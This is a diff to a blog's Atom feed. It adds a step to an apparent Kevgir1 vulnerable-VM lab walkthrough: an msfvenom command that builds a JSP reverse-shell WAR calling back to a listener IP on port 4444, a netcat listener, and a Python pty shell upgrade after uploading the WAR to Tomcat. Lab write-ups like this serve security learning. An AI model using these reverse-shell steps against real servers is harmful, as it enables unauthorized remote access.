@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-05-03T14:20:48-05:00</updated>
+  <updated>2016-05-03T16:46:26-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -116,7 +116,19 @@ jar -cvf ../webshell.war *</p>
 
 <p><img src="/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
 
+<p>Lets use msfvenom to create webshell</p>
+
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>
+
+<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>get the shell</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
 <p>DONE for Tomcat</p>
+
+<p>Now move to port 8081</p>
 ]]></content>
   </entry>
   
